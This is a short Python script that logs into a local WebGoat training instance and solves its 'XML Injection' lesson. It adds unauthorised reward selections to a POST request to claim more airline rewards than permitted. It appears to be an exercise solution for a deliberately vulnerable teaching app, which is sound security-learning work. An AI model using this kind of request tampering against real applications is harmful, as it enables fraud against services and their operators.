import requests
import json

session = requests.session()

# Load initial login screen
session.get("http://127.0.0.1:8080/WebGoat")
# Data used for login
data = {'username': 'guest', 'password' : 'guest'}
# Logging in using the cookie given to us and the data credientials
session.post("http://127.0.0.1:8080/WebGoat/j_spring_security_check;jsessionid=" + str(session.cookies),data)
# Loading the dynamic lesson menu
request = session.get("http://127.0.0.1:8080/WebGoat/service/lessonmenu.mvc")
# Parse the dynamic lesson menu's response to get only the names of the lessons and their
# corresponding dynamic values pairs. 
splitMenu = str(request.text).split("},{")
for i in splitMenu:
	# Looking for the name of our vuln. in the lesson menu's JSON response
	if "XML Injection" in i:
		split_injection = i.split(",")
		URL = split_injection[4].split("\"")

# The XML data that we are going to inject into the application
data = {'accountID':'836239','check1004':'on','check1005':'on','SUBMIT':'Submit'}
# The POST resquest that uses malicious XML data to get more airline rewards than we should be 
# able to get. 
request = session.post("http://127.0.0.1:8080/WebGoat/" + URL[3], data)
print request.text

